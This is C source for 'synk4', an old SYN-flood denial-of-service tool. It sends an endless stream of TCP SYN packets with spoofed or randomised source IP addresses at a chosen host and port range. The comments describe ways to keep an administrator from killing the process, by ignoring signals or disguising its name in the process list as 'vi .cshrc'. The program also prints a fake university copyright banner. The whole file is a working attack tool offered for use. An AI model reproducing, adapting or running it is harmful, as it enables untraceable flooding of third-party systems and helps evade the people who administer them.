/* Syn synk_flooder by Zakath
 * TCP Functions by trurl_ (thanks man).
 * Some more code by Zakath.
 * Speed/Misc Tweaks/Enhancments -- ultima
 * Nice Interface -- ultima
 * Random IP Spoofing Mode -- ultima
 * How To Use:
 * Usage is simple. srcaddr is the IP the packets will be spoofed from.
 * dstaddr is the target machine you are sending the packets to.
 * low and high ports are the ports you want to send the packets to.
 * Random IP Spoofing Mode: Instead of typing in a source address, 
 * just use '0'. This will engage the Random IP Spoofing mode, and
 * the source address will be a random IP instead of a fixed ip.
 * Released: [4.29.97]
 *  To compile: cc -o synk4 synk4.c
 * 
 */
#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
/* These can be handy if you want to run the synk_flooder while the admin is on
 * this way, it makes it MUCH harder for him to kill your synk_flooder */
/* Ignores all signals except Segfault */
// #define HEALTHY
/* Ignores Segfault */
// #define NOSEGV
/* Changes what shows up in ps -aux to whatever this is defined to */
// #define HIDDEN "vi .cshrc"
#define SEQ 0x28376839
#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))

unsigned long send_seq, ack_seq, srcport;
char synk_flood = 0;
int sock, ssock, curc, cnt;

/* Check Sum */
unsigned short
ip_sum (addr, len)
u_short *addr;
int len;
{
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;
	
	while (nleft > 1)
	  {
		  sum += *w++;
		  nleft -= 2;
	  }
	if (nleft == 1)
	  {
		  *(u_char *) (&answer) = *(u_char *) w;
		  sum += answer;
	  }
	sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */
	sum += (sum >> 16);           /* add carry */
	answer = ~sum;                /* truncate to 16 bits */
	return (answer);
}
void sig_exit(int crap)
{
#ifndef HEALTHY
	printf("[H[JSignal Caught. Exiting Cleanly.\n");
	exit(crap);
#endif
}
void sig_segv(int crap)
{
#ifndef NOSEGV
	printf("[H[JSegmentation Violation Caught. Exiting Cleanly.\n");
	exit(crap);
#endif
}

unsigned long getaddr(char *name) {
	struct hostent *hep;
	
	hep=gethostbyname(name);
	if(!hep) {
		fprintf(stderr, "Unknown host %s\n", name);
		exit(1);
	}
	return *(unsigned long *)hep->h_addr;
}


void send_tcp_segment(struct iphdr *ih, struct tcphdr *th, char *data, int dlen) {
	char buf[65536];
	struct {  /* rfc 793 tcp pseudo-header */
		unsigned long saddr, daddr;
		char mbz;
		char ptcl;
		unsigned short tcpl;
	} ph;
	
	struct sockaddr_in sin;	/* how necessary is this, given that the destination
				 address is already in the ip header? */
	
	ph.saddr=ih->saddr;
	ph.daddr=ih->daddr;
	ph.mbz=0;
	ph.ptcl=IPPROTO_TCP;
	ph.tcpl=htons(sizeof(*th)+dlen);
	
	memcpy(buf, &ph, sizeof(ph));
	memcpy(buf+sizeof(ph), th, sizeof(*th));
	memcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);
	memset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);
	th->check=ip_sum(buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);
	
	memcpy(buf, ih, 4*ih->ihl);
	memcpy(buf+4*ih->ihl, th, sizeof(*th));
	memcpy(buf+4*ih->ihl+sizeof(*th), data, dlen);
	memset(buf+4*ih->ihl+sizeof(*th)+dlen, 0, 4);
	
	ih->check=ip_sum(buf, (4*ih->ihl + sizeof(*th)+ dlen + 1) & ~1);
	memcpy(buf, ih, 4*ih->ihl);
	
	sin.sin_family=AF_INET;
	sin.sin_port=th->dest;
	sin.sin_addr.s_addr=ih->daddr;
	
	if(sendto(ssock, buf, 4*ih->ihl + sizeof(*th)+ dlen, 0, &sin, sizeof(sin))<0) {
		printf("Error sending syn packet.\n"); perror("");
		exit(1);
	}
}

unsigned long spoof_open(unsigned long my_ip, unsigned long their_ip, unsigned short port) {
	int i, s;
	struct iphdr ih;
	struct tcphdr th;
	struct sockaddr_in sin;
	int sinsize;
	unsigned short myport=6969;
	char buf[1024];
	struct timeval tv;
	
	ih.version=4;
	ih.ihl=5;
	ih.tos=0;			/* XXX is this normal? */
	ih.tot_len=sizeof(ih)+sizeof(th);
	ih.id=htons(random());
	ih.frag_off=0;
	ih.ttl=30;
	ih.protocol=IPPROTO_TCP;
	ih.check=0;
	ih.saddr=my_ip;
	ih.daddr=their_ip;
	
	th.source=htons(srcport);
	th.dest=htons(port);
	th.seq=htonl(SEQ);
	th.doff=sizeof(th)/4;
	th.ack_seq=0;
	th.res1=0;
	th.fin=0;
	th.syn=1;
	th.rst=0;
	th.psh=0;
	th.ack=0;
	th.urg=0;
//	th.res2=0;
	th.window=htons(65535);
	th.check=0;
	th.urg_ptr=0;
	
	gettimeofday(&tv, 0);
	
	send_tcp_segment(&ih, &th, "", 0); 
	
	send_seq = SEQ+1+strlen(buf);
}
void upsc()
{
	int i;
	char schar;
	switch(cnt)
	  {
	  case 0:
		    {
			    schar = '|';
			    break;
		    }
	  case 1:
		    {
			    schar = '/';
			    break;
		    }
	  case 2:
		    {
			    schar = '-';
			    break;
		    }
	  case 3:
		    {
			    schar = '\\';
			    break;
		    }
	  case 4:
		    {
			    schar = '|';
			    cnt = 0;
			    break;
		    }
	  }
	printf("[H[1;30m[[1;31m%c[1;30m][0m %d", schar, curc);
	cnt++;
	for(i=0; i<26; i++)  {
		i++;
		curc++;
	}
}
void init_signals()
{
	// Every Signal known to man. If one gives you an error, comment it out!
	signal(SIGHUP, sig_exit);
	signal(SIGINT, sig_exit);
	signal(SIGQUIT, sig_exit);
	signal(SIGILL, sig_exit);
	signal(SIGTRAP, sig_exit);
	signal(SIGIOT, sig_exit);
	signal(SIGBUS, sig_exit);
	signal(SIGFPE, sig_exit);
	signal(SIGKILL, sig_exit);
	signal(SIGUSR1, sig_exit);
	signal(SIGSEGV, sig_segv);
	signal(SIGUSR2, sig_exit);
	signal(SIGPIPE, sig_exit);
	signal(SIGALRM, sig_exit);
	signal(SIGTERM, sig_exit);
	signal(SIGCHLD, sig_exit);
	signal(SIGCONT, sig_exit);
	signal(SIGSTOP, sig_exit);
	signal(SIGTSTP, sig_exit);
	signal(SIGTTIN, sig_exit);
	signal(SIGTTOU, sig_exit);
	signal(SIGURG, sig_exit);
	signal(SIGXCPU, sig_exit);
	signal(SIGXFSZ, sig_exit);
	signal(SIGVTALRM, sig_exit);
	signal(SIGPROF, sig_exit);
	signal(SIGWINCH, sig_exit);
	signal(SIGIO, sig_exit);
	signal(SIGPWR, sig_exit);
}
synk4_main(int argc, char **argv) {
   int i, x, max, synk_floodloop, diff, urip, a, b, c, d;
   unsigned long them, me_fake;
   unsigned lowport, highport;
   char buf[1024], *junk;
   
   init_signals();   
#ifdef HIDDEN
   for (i = argc-1; i >= 0; i--)
     /* Some people like bzero...i prefer memset :) */
     memset(argv[i], 0, strlen(argv[i]));
   strcpy(argv[0], HIDDEN);
#endif
   
   if(argc<5) {
      printf("Usage: %s srcaddr dstaddr low high\n", argv[0]);
      printf("    If srcaddr is 0, random addresses will be used\n\n\n");
      
      exit(1);
   }
   if( atoi(argv[1]) == 0 )
     urip = 1;
   else    
     me_fake=getaddr(argv[1]);
   them=getaddr(argv[2]);
   lowport=atoi(argv[3]);
   highport=atoi(argv[4]);
   srandom(time(0));
   ssock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if(ssock<0) {
      perror("socket (raw)");
      exit(1);
   }
   sock=socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
   if(sock<0) {
      perror("socket");
      exit(1);
   }
   junk = (char *)malloc(1024);
   max = 1500;
   i = 1;
   diff = (highport - lowport);
   
   if (diff > -1) 
     {
	printf("[H[J\n\nCopyright (c) 1980, 1983, 1986, 1988, 1990, 1991 The Regents of the University\n of California. All Rights Reserved.");
	for (i=1;i>0;i++)
	  {
	     srandom((time(0)+i));
	     srcport = getrandom(1, max)+1000;
	     for (x=lowport;x<=highport;x++) 
	       {
		  if ( urip == 1 )
		    {
		       a = getrandom(0, 255);
		       b = getrandom(0, 255);
		       c = getrandom(0, 255);
		       d = getrandom(0, 255);
		       sprintf(junk, "%i.%i.%i.%i", a, b, c, d);
		       me_fake = getaddr(junk);
		    }
		  
		  spoof_open(/*0xe1e26d0a*/ me_fake, them, x);
		  /* A fair delay. Good for a 28.8 connection */ 
		  usleep(300);
		  
		  if (!(synk_floodloop = (synk_floodloop+1)%(diff+1))) {
		     upsc(); fflush(stdout);
		  }
	       }
	  }
     }
   else {
      printf("High port must be greater than Low port.\n");
      exit(1);
   }
}

